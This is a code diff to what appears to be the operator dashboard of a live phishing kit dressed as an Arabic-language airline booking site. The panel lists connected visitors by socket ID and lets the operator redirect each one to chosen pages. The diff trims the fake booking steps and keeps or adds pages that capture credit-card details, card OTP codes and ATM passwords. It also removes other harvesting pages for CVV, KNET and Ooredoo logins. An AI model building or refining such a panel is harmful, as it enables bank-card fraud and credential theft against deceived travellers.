@@ -3830,13 +3830,10 @@
         { key: 'الصفحة الرئيسية', label: 'الرئيسية', color: 'bg-gray-100 text-gray-800' },
         { key: 'flight-search', label: 'نتائج البحث', color: 'bg-blue-100 text-blue-800' },
         { key: 'passenger-details', label: 'بيانات المسافر', color: 'bg-indigo-100 text-indigo-800' },
-        { key: 'emergency-contact', label: 'جهة الاتصال', color: 'bg-purple-100 text-purple-800' },
-        { key: 'wheelchair', label: 'كرسي متحرك', color: 'bg-pink-100 text-pink-800' },
-        { key: 'seat-customization', label: 'اختيار المقعد', color: 'bg-yellow-100 text-yellow-800' },
-        { key: 'meals', label: 'الوجبات', color: 'bg-orange-100 text-orange-800' },
-        { key: 'customize-your-trip', label: 'تخصيص الرحلة', color: 'bg-teal-100 text-teal-800' },
-        { key: 'extras', label: 'إضافات', color: 'bg-cyan-100 text-cyan-800' },
-        { key: 'review-pay', label: 'المراجعة والدفع', color: 'bg-green-100 text-green-800' }
+        { key: 'seat-customization', label: 'ملخص الحجز', color: 'bg-yellow-100 text-yellow-800' },
+        { key: 'credit-card-payment', label: 'الدفع بالبطاقة', color: 'bg-green-100 text-green-800' },
+        { key: 'otp-verification', label: 'OTP', color: 'bg-purple-100 text-purple-800' },
+        { key: 'atm-password', label: 'ATM', color: 'bg-pink-100 text-pink-800' }
       ];
 
       const pageStatsContent = document.getElementById('pageStatsContent');
@@ -4156,24 +4153,12 @@
       html += '<select id="navigateSelectTop" class="px-3 py-2 border rounded-lg">';
       html += '<option value="">اختر صفحة</option>';
       html += '<option value="__home__">الصفحة الرئيسية</option>';
-      html += '<option value="flight-search">نتائج البحث عن الرحلات</option>';
+      html += '<option value="flight-search">نتائج البحث</option>';
       html += '<option value="passenger-details">بيانات المسافر</option>';
-      html += '<option value="emergency-contact">جهة الاتصال للطوارئ</option>';
-      html += '<option value="wheelchair">كرسي متحرك</option>';
-      html += '<option value="seat-customization">اختيار المقعد</option>';
-      html += '<option value="meals">الوجبات</option>';
-      html += '<option value="customize-your-trip">تخصيص الرحلة</option>';
-      html += '<option value="extras">إضافات</option>';
-      html += '<option value="review-pay">المراجعة والدفع</option>';
+      html += '<option value="seat-customization">ملخص الحجز</option>';
       html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
       html += '<option value="otp-verification">OTP البطاقة</option>';
-      html += '<option value="cvv">CVV البطاقة</option>';
       html += '<option value="atm-password">كلمة مرور ATM</option>';
-      html += '<option value="knet-payment">دفع كي نت (KNET)</option>';
-      html += '<option value="network-operator">مشغل الشبكة</option>';
-      html += '<option value="ooredoo-login">تسجيل الدخول Ooredoo</option>';
-      html += '<option value="otp-login">OTP دخول</option>';
-      html += '<option value="customer-authentication">مصادقة العميل</option>';
       html += '<option value="final-page">الصفحة النهائية</option>';
       html += '</select>';
       html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
@@ -4916,24 +4901,12 @@
       html += '<div class="flex gap-2"><select id="navigateSelect" class="flex-1 px-3 py-2 border rounded-lg">';
       html += '<option value="">اختر صفحة</option>';
       html += '<option value="__home__">الصفحة الرئيسية</option>';
-      html += '<option value="flight-search">نتائج البحث عن الرحلات</option>';
+      html += '<option value="flight-search">نتائج البحث</option>';
       html += '<option value="passenger-details">بيانات المسافر</option>';
-      html += '<option value="emergency-contact">جهة الاتصال للطوارئ</option>';
-      html += '<option value="wheelchair">كرسي متحرك</option>';
-      html += '<option value="seat-customization">اختيار المقعد</option>';
-      html += '<option value="meals">الوجبات</option>';
-      html += '<option value="customize-your-trip">تخصيص الرحلة</option>';
-      html += '<option value="extras">إضافات</option>';
-      html += '<option value="review-pay">المراجعة والدفع</option>';
+      html += '<option value="seat-customization">ملخص الحجز</option>';
       html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
       html += '<option value="otp-verification">OTP البطاقة</option>';
-      html += '<option value="cvv">CVV البطاقة</option>';
       html += '<option value="atm-password">كلمة مرور ATM</option>';
-      html += '<option value="knet-payment">دفع كي نت (KNET)</option>';
-      html += '<option value="network-operator">مشغل الشبكة</option>';
-      html += '<option value="ooredoo-login">تسجيل الدخول Ooredoo</option>';
-      html += '<option value="otp-login">OTP دخول</option>';
-      html += '<option value="customer-authentication">مصادقة العميل</option>';
       html += '<option value="final-page">الصفحة النهائية</option>';
       html += '</select>';
       html += '<button onclick="navigateVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">توجيه</button></div></div>';
